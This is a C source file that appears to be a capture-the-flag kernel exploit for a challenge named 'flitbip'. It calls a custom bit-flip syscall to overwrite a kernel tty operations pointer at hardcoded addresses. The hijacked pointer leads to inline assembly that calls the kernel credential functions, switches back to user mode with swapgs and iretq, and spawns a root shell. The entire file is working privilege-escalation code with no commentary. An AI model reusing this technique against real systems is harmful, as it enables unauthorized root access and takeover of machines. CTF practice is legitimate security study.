#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long *current_t = 0xffffffff8182e040;
unsigned long *n_tty_o = 0xffffffff8183e320;
unsigned long *n_tty_r = 0xffffffff810c8510;

void get_shell(void) {
	char *arg[] = {"/bin/sh", NULL};
	char *env[] = {NULL};
	
	if(getuid() == 0) {
		printf("got dat root: %d\n", getuid());
		execve(arg[0], arg, env);
	} else {
		printf("aint got that root\n");
	}

	return;
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void escalate_privs(void) {
	printf("escalatte\n");
	
	__asm__(
		".intel_syntax noprefix;"
		"movabs rax, 0xffffffff81033e92;"
		"xor rdi, rdi;"
		"call rax; mov rdi, rax;"
		"movabs rax, 0xffffffff81033d41;"
		"call rax;"
		"swapgs;"
		"mov r15, user_ss;"
		"push r15;"
		"mov r15, user_sp;"
		"push r15;"
		"mov r15, user_rflags;"
		"push r15;"
		"mov r15, user_cs;"
		"push r15;"
		"mov r15, user_rip;"
		"push r15;"
		"iretq;"
		".att_syntax;"
	);
}

void save_state() {
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
}


long flitbip(long *addr, long bit) {
	__asm__(
		".intel_syntax noprefix;"
		"mov rax, 333;"
		"syscall;"
		".att_syntax;"
	);
}

int main() {
	char c;
	
	unsigned long *f_count = 0xffffffff818f4f78;	
	flitbip(f_count, (long)63);
	save_state();

	//unsigned long diff = (unsigned long)get_shell ^ (unsigned long)n_tty_r;
	unsigned long diff = (unsigned long)escalate_privs ^ (unsigned long)n_tty_r;

	printf("n_tty_r = %lx\n", (unsigned long)n_tty_r);
	printf("get_shell = %lx\n", (unsigned long)escalate_privs);

	printf("diff = %lx\n", diff);

	for(int i=0;i<64;i++) {
		if(diff & (1ULL << i)) {
			flitbip((char *)n_tty_o+0x30, i);
		}
	}
	
	scanf("%c", &c);
	while(2);
	
	return 0;
}
